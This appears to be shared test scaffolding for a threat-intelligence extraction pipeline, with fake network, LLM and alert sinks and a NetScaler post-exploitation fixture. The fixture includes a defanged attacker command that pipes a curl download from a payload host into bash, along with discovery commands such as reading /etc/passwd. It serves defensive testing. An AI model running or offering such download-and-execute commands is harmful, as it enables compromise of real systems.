// Shared test scaffolding: fixture messages, a fake fetch, a fake LLM, and captured email/Discord.

import { readFileSync } from 'node:fs';
import { _setLLM } from '../lib/llm.js';
import { _setEmailSink } from '../lib/email.js';
import { _setDiscordSink } from '../lib/discord.js';
import { _resetRobotsCache } from '../lib/fetch-source.js';

const fx = (p) => new URL(`../fixtures/${p}`, import.meta.url);
export const readFixture = (p) => readFileSync(fx(p), 'utf8');

export function fixtureMessage(file, overrides = {}) {
  const raw = readFixture(`briefs/${file}`);
  return { getRaw: async () => raw, receivedAt: '2026-10-21T11:20:00Z', ...overrides };
}

/** Swap a header in a fixture's raw MIME (e.g. a new Message-ID / Subject / From for the same body). */
export function withHeaders(file, headers) {
  let raw = readFixture(`briefs/${file}`);
  for (const [k, v] of Object.entries(headers)) raw = raw.replace(new RegExp(`^${k}: .*$`, 'm'), `${k}: ${v}`);
  return { getRaw: async () => raw, receivedAt: '2026-10-22T11:20:00Z' };
}

const html = (body, status = 200) => new Response(body, { status, headers: { 'content-type': 'text/html; charset=utf-8' } });

/** Fake network for the fixture sources. Counts calls per URL. */
export function fakeFetch() {
  const calls = [];
  const impl = async (url) => {
    calls.push(String(url));
    const u = new URL(url);
    if (u.pathname === '/robots.txt') return new Response(readFixture('sources/robots.txt'), { status: 200 });
    switch (u.pathname) {
      case '/netscaler-post-exploitation': return html(readFixture('sources/netscaler.html'));
      case '/poisoned': return html(readFixture('sources/poisoned.html'));
      case '/retailer': return html(readFixture('sources/retailer.html'));
      case '/404': return html('not found', 404);
      case '/slow': { const e = new Error('The operation was aborted due to timeout'); e.name = 'TimeoutError'; throw e; }
      case '/huge': return html('<html><body><article>' + 'A'.repeat(5 * 1024 * 1024) + '</article></body></html>');
      default: return html('<html><body><article><p>generic page</p></article></body></html>');
    }
  };
  impl.calls = calls;
  return impl;
}

/** A schema-valid empty extraction with the given story title. */
export const emptyExtraction = (title, priority = 3) => ({
  story: { title, summary: 'Thin story.', threat_actor: null, malware_family: null, cves: [], attack_techniques: [],
    sector_relevance: ['all'], priority, priority_reason: 'little detail', earliest_published: null },
  behaviors: [], detection_guidance: [], evidence_samples: [], iocs: [], more_sources: [],
});

export const NETSCALER_EXTRACTION = {
  story: {
    title: 'NetScaler ADC post-exploitation: shell from nsppe, discovery, curl|bash',
    summary: 'After exploiting CVE-2026-88779, attackers spawn a shell from the NetScaler web process, run discovery, and pull a second stage with curl.',
    threat_actor: null, malware_family: null, cves: ['CVE-2026-88779'], attack_techniques: ['T1190', 'T1059.004', 'T1082', 'T1105'],
    sector_relevance: ['all'], priority: 3, priority_reason: 'model under-scored on purpose (pipeline floor should raise it)', earliest_published: '2026-10-20',
  },
  behaviors: [
    { attack_technique: 'T1059.004', pattern_kind: 'shell_from_server_process', parent: 'nsppe', children: ['sh', 'whoami', 'id', 'curl', 'bash'],
      log_source: 'NetScaler shell log (/var/log/bash.log)', time_window: '2 minutes', vendor_stated: true, source_quote_ref: 'S1: "the NetScaler packet-processing web process nsppe spawning an interactive shell"' },
    { attack_technique: 'T1082', pattern_kind: 'discovery_burst', parent: 'nsppe', children: ['whoami', 'id', 'uname -a', 'cat /etc/passwd'],
      log_source: 'NetScaler shell log', time_window: '2 minutes', vendor_stated: true, source_quote_ref: 'S1: "ran a burst of discovery commands"' },
  ],
  detection_guidance: [
    { description: 'Hunt appliance shell logs for commands executed by nobody as children of nsppe', log_source: '/var/log/bash.log, /var/log/notice.log',
      attack_technique: 'T1059.004', url: 'https://research.vendor-fixture.test/netscaler-post-exploitation', verbatim_query: null, publisher_tier: 'A' },
  ],
  evidence_samples: [
    { kind: 'command_line', raw: '/bin/sh -c whoami', log_source_guess: 'NetScaler shell log', attack_technique: 'T1059.004', source_quote_ref: 'S1 code block' },
    { kind: 'command_line', raw: '/bin/sh -c curl -s hxxp://45[.]61[.]139[.]12/x.sh | bash', log_source_guess: 'NetScaler shell log', attack_technique: 'T1105', source_quote_ref: 'S1 code block' },
  ],
  iocs: [
    { type: 'ipv4', value: '45[.]61[.]139[.]12', role: 'payload_host', confidence: 'vendor_stated', context: 'serves x.sh second stage' },
    { type: 'domain', value: 'update-check[.]net', role: 'c2', confidence: 'vendor_stated', context: 'second-stage callback' },
    { type: 'domain', value: 'example.com', role: 'c2', confidence: 'inferred', context: 'placeholder — must be dropped' },
    { type: 'ipv4', value: '10.0.0.1', role: 'c2', confidence: 'inferred', context: 'private — must be dropped' },
  ],
  more_sources: [],
};

/**
 * Fake LLM. `responder(userText, callIndexForThisStory)` returns the JSON object to emit.
 * Records every request so tests can assert on what the model was (not) shown.
 */
export function installFakeLLM(responder) {
  const calls = [];
  const perStory = new Map();
  _setLLM(async (req) => {
    calls.push(req);
    const user = req.messages[0].content;
    const k = user.slice(0, 400);
    const n = perStory.get(k) || 0; perStory.set(k, n + 1);
    const out = responder(user, n, req);
    return { text: JSON.stringify(out), usage: { input_tokens: 1000, output_tokens: 500 }, model: 'claude-opus-5-5' };
  });
  return calls;
}

/** Default responder: NetScaler story gets the rich extraction, everything else a thin one. */
export const defaultResponder = (user) => (/nsppe|NetScaler ADC post-exploitation/.test(user) ? NETSCALER_EXTRACTION : emptyExtraction('Other story'));

export function captureOutputs() {
  const emails = []; const discord = [];
  _setEmailSink((m) => emails.push(m));
  _setDiscordSink((l) => discord.push(l));
  _resetRobotsCache();
  return { emails, discord };
}
